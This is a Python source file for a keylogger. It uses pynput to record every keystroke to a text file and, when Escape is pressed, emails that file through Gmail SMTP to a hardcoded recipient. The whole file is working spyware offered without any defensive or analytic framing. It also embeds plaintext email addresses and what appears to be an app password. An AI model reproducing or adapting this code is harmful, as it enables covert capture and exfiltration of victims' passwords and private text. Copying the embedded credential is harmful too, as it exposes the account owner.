from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import os

# Define email parameters
EMAIL_ADDRESS = 'rifat368427@gmail.com'
EMAIL_PASSWORD = 'hrtcvhgusnfryfij'
TO_EMAIL = 'mohammad.rifatkhan01@gmail.com'
SUBJECT = 'Keystrokes Data'

# Function to send email
def send_email(file_path):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_EMAIL
    msg['Subject'] = SUBJECT

    # Attach the text file
    with open(file_path, "r") as f:
        attachment = MIMEApplication(f.read(), _subtype="txt")
        attachment.add_header('Content-Disposition', 'attachment', filename=os.path.basename(file_path))
        msg.attach(attachment)

    # Send the email
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to handle key press events
def on_press(key):
    file_path = "info.txt"
    with open(file_path, "a") as f:
        try:
            f.write(f"{key.char}\n")
        except AttributeError:
            f.write(f"{key}\n")

    # Check if ESC is pressed, if so, send the email and exit
    if key == Key.esc:
        send_email(file_path)
        exit(0)

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()

send_email("info.txt")